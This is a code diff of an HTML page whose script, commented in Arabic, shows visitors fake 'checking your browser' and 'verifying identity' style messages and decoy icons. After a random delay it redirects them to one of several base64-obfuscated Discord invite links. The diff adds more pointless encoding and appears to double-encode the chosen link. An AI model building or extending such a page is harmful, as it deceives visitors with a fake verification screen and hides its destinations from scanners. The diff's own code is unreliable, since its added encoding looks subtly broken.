@@ -17,23 +17,15 @@
       }
     </style>
     <script>
-      // ألوان خلفية عشوائية
-      const bgColors = ["#f2f2f2", "#e0f7fa", "#fff3e0", "#ede7f6", "#fce4ec", "#f1f8e9"];
-      
+      // ألوان عشوائية
+      const bgColors = [
+        "#f2f2f2", "#e0f7fa", "#fff3e0", "#ede7f6", "#fce4ec", "#f1f8e9"
+      ];
+
       // خطوط عشوائية
       const fonts = ["Arial", "Tahoma", "Verdana", "Courier New", "Georgia"];
 
-      // عناوين صفحة عشوائية
-      const titles = [
-        "Connecting...",
-        "Checking Session",
-        "Please Wait",
-        "Redirecting...",
-        "Securing Request",
-        "Verifying Identity"
-      ];
-
-      // نصوص وهمية
+      // رسائل عشوائية
       const fakeMessages = [
         "Checking your browser before accessing...",
         "Connecting to server...",
@@ -44,44 +36,49 @@
         "Validating..."
       ];
 
-      // صور وهمية
+      // صور عشوائية
       const icons = [
-        "https://cdn-icons-png.flaticon.com/512/733/733547.png", // facebook
-        "https://cdn-icons-png.flaticon.com/512/732/732200.png", // file
-        "https://cdn-icons-png.flaticon.com/512/107/107831.png", // lock
-        "https://cdn-icons-png.flaticon.com/512/891/891462.png", // spinner
-        "https://cdn-icons-png.flaticon.com/512/545/545705.png"  // cloud
+        "https://cdn-icons-png.flaticon.com/512/733/733547.png", 
+        "https://cdn-icons-png.flaticon.com/512/732/732200.png", 
+        "https://cdn-icons-png.flaticon.com/512/107/107831.png", 
+        "https://cdn-icons-png.flaticon.com/512/891/891462.png", 
+        "https://cdn-icons-png.flaticon.com/512/545/545705.png"
       ];
 
       // روابط ديسكورد مشفرة
       const encodedLinks = [
-        "aHR0cHM6Ly9kaXNjb3JkLmdnL3lkWHRmQmRhZzY=",
-        "aHR0cHM6Ly9kaXNjb3JkLmdnL2JKVWFBWUdld0Q=",
-        "aHR0cHM6Ly9kaXNjb3JkLmdnL1VLVzQ5V0t2M3o=",
-        "aHR0cHM6Ly9kaXNjb3JkLmdnLzNySHNINzJoYWI=",
-        "aHR0cHM6Ly9kaXNjb3JkLmdnL2pmc2dBODN6WGg=",
-        "aHR0cHM6Ly9kaXNjb3JkLmdnLzV5ajU4Y25na3g=",
-        "aHR0cHM6Ly9kaXNjb3JkLmdnL21KRmJEbWFtdmo=",
+        "aHR0cHM6Ly9kaXNjb3JkLmdnL3lkWHRmQmRhZzY=", 
+        "aHR0cHM6Ly9kaXNjb3JkLmdnL2JKVWFBWUdld0Q=", 
+        "aHR0cHM6Ly9kaXNjb3JkLmdnL1VLVzQ5V0t2M3o=", 
+        "aHR0cHM6Ly9kaXNjb3JkLmdnLzNySHNINzJoYWI=", 
+        "aHR0cHM6Ly9kaXNjb3JkLmdnL2pmc2dBODN6WGg=", 
+        "aHR0cHM6Ly9kaXNjb3JkLmdnLzV5ajU4Y25na3g=", 
+        "aHR0cHM6Ly9kaXNjb3JkLmdnL21KRmJEbWFtdmo=", 
         "aHR0cHM6Ly9kaXNjb3JkLmdnL21LbWo5ZVVkM3g="
       ];
+
+      // تشفير القيم العشوائية
+      function encodeRandomValue(values) {
+        const randomValue = values[Math.floor(Math.random() * values.length)];
+        return btoa(randomValue);
+      }
 
       // تنفيذ عند التحميل
       window.onload = function () {
         // اختيارات عشوائية
-        const bg = bgColors[Math.floor(Math.random() * bgColors.length)];
-        const font = fonts[Math.floor(Math.random() * fonts.length)];
-        const title = titles[Math.floor(Math.random() * titles.length)];
-        const message = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
-        const icon = icons[Math.floor(Math.random() * icons.length)];
-        const encodedLink = encodedLinks[Math.floor(Math.random() * encodedLinks.length)];
+        const bg = encodeRandomValue(bgColors);
+        const font = encodeRandomValue(fonts);
+        const message = encodeRandomValue(fakeMessages);
+        const icon = encodeRandomValue(icons);
+        const encodedLink = encodeRandomValue(encodedLinks);
         const delay = Math.floor(Math.random() * 2000) + 1000; // من 1000 إلى 3000
 
-        // تطبيق القيم
-        document.body.style.backgroundColor = bg;
-        document.body.style.fontFamily = font;
-        document.title = title;
-        document.getElementById("fake-status").textContent = message;
-        document.getElementById("fake-icon").src = icon;
+        // تطبيق القيم المشفرة
+        document.body.style.backgroundColor = atob(bg);
+        document.body.style.fontFamily = atob(font);
+        document.title = "Redirecting...";
+        document.getElementById("fake-status").textContent = atob(message);
+        document.getElementById("fake-icon").src = atob(icon);
 
         // التوجيه بعد التأخير
         setTimeout(() => {
